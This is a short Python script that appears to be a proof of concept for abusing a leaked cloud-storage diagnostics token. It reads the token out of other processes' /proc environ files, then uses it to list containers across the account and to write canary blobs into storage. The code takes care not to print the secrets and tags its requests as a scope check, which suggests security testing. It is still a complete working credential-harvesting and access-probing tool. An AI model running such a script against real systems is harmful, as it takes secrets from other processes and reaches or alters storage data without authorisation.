#!/usr/bin/env python3
"""Test the leaked diagnostics URL's storage scope without printing secrets."""

import glob
import hashlib
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


def sas_url():
    sas_file = __import__("os").environ.get("DIAGNOSTICS_SAS_FILE", "")
    if sas_file:
        return open(sas_file).read().strip()
    proc_root = __import__("os").environ.get("PROC_ROOT", "/proc")
    for path in glob.glob(proc_root + "/[0-9]*/environ"):
        try:
            values = open(path, "rb").read().split(b"\0")
            env = dict(item.split(b"=", 1) for item in values if b"=" in item)
        except OSError:
            continue
        key = next((item for item in (b"diagnostics_sas_uri", b"diagnosticsSasUri")
                    if item in env), b"")
        if key:
            return env[key].decode()
    raise SystemExit("HCA diagnostics URL not found")


original = sas_url()
parts = urllib.parse.urlsplit(original)
segments = [item for item in parts.path.split("/") if item]
container_path = "/" + segments[0] if segments else "/"
query_fields = urllib.parse.parse_qs(parts.query, keep_blank_values=True)
print(
    "HCA_DIAG_META host=%s segments=%d sp=%s sr=%s ss=%s srt=%s" % (
        parts.hostname or "-", len(segments), query_fields.get("sp", ["-"])[0],
        query_fields.get("sr", ["-"])[0], query_fields.get("ss", ["-"])[0],
        query_fields.get("srt", ["-"])[0],
    )
)
paths = [("owned_container", container_path), ("account", "/"),
         ("other_container", "/3900000-nonexistent")]
for label, path in paths:
    query = parts.query + "&restype=container&comp=list"
    url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, query, ""))
    request = urllib.request.Request(url, headers={"User-Agent": "owned-diagnostics-scope-check-3900000"})
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            status, data = response.status, response.read(1 << 20)
    except urllib.error.HTTPError as error:
        status, data = error.code, error.read(1 << 20)
    except OSError as error:
        print(f"HCA_DIAG_SCOPE label={label} network={type(error).__name__}")
        continue
    names = []
    try:
        root = ET.fromstring(data)
        names = [node.text or "" for node in root.iter() if node.tag.rsplit("}", 1)[-1] == "Name"]
    except ET.ParseError:
        pass
    digest = hashlib.sha256("\n".join(names).encode()).hexdigest()[:12]
    print(f"HCA_DIAG_SCOPE label={label} status={status} bytes={len(data)} names={len(names)} names_hash={digest}")

canary = "owned-scope-3900000-" + hashlib.sha256(parts.query.encode()).hexdigest()[:16]
for label, path in (("owned_blob", container_path + "/" + canary),
                    ("other_blob", "/3900000-nonexistent/" + canary)):
    url = urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, parts.query, ""))
    request = urllib.request.Request(
        url, method="PUT", data=b"",
        headers={"x-ms-blob-type": "BlockBlob",
                 "User-Agent": "owned-diagnostics-create-check-3900000"},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            status, size = response.status, len(response.read(4096))
    except urllib.error.HTTPError as error:
        status, size = error.code, len(error.read(4096))
    except OSError as error:
        print(f"HCA_DIAG_CREATE label={label} network={type(error).__name__}")
        continue
    print(f"HCA_DIAG_CREATE label={label} status={status} bytes={size}")
